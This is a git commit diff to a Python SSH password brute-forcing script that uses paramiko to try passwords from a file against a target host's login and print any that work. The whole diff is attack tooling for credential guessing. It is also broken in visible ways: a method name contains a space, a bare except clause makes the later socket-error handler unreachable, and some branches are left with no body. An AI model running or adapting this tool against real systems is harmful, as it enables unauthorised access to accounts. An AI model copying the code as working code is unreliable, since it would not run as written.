ce03a2a517823a6aeac65d01f38eccdc3ce65961
xenacode-art <obinnakaja1@gmail.com>
2022-01-07 14:33:34 -0500

    Usinf=d ssh Threading Library

--- SSHBruteforce/sshbrutethreading.py
+++ SSHBruteforce/sshbrutethreading.py
@@ -1,17 +1,27 @@
 import paramiko , sys , os , socket , termcolor
+import threading , time
 
+stop_flag = 0
 
 def ssh_connect(password,code= 0 ):
-
+  global stop_flag
   ssh = paramiko.SSHClient()
   ssh.set missing_host_key_policy(paramiko.AutoAddPolicy())
+  
   try:
     ssh.connect(host, port = 22, username = username, password = password)
+    stop_flag = 1 
+    print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green' ))
      
-  
-  except paramiko.AuthenticationException:
-    code = 1
-   
+  except:
+    print(termcolor.colored(('[-] Incorrect Password: ' + password) , 'red'))
+    ssh.close
+     
+  #except paramiko.AuthenticationException:
+   # code = 1
+    #print('[-] Incorrect Login: ' + password) 
+    
+     
   except socket.error as e:
     code = 2
   
@@ -33,11 +43,11 @@ with open(input_file, 'r') as file:
      try:
        response = ssh_connect(password)
        if response == 0:
-         print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green' ))
+         #print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green' ))
          break  
          
        elif response == 1:
-         print('[-] Incorrect Login: ' + password) 
+         #print('[-] Incorrect Login: ' + password) 
            
        elif response == 2: 
          print('[!!] Cant Connect') 
